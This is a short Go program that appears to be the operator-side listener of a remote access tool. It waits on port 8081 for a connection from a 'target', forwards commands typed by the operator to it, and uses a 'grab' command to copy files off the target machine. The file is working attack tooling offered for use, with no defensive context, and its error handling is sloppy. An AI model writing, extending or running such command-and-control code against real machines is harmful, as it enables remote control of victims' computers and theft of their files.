package main

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os"
	"strings"
	"sync"
)

var wg sync.WaitGroup

func main() {

	fmt.Println("waiting for incoming connection [-] ")
	fmt.Println("                                    ")
	//mention the port and the ip you want to serve on as net.Listen("tcp", "192.168.0.1:8081")
	ln, _ := net.Listen("tcp", ":8081")
	conn, _ := ln.Accept()
	if conn != nil {
		fmt.Println("Connected to the target [+] [+] [+] ")
	}
	for {
		reader := bufio.NewReader(os.Stdin)
		fmt.Println("Enter The Command to execute : ")
		text, _ := reader.ReadString('\n')
		conn.Write([]byte(text + "\n"))
		if strings.Contains(text, "grab") {
			name := strings.Split(text, "*")
			filenn := name[1]
			newext := strings.Split(filenn, ".")
			k := "file."
			ful, _ := os.Create(k + newext[1])

			io.Copy(ful, conn)

		}

	}
}

//Usage grab * file path
// Example grab * /home/alone/Downloads/file.png
// There are several methods like io.CopyN() so that we can return the EOF

/* NoTE This is an inconsistent way of data transfer in tcp */
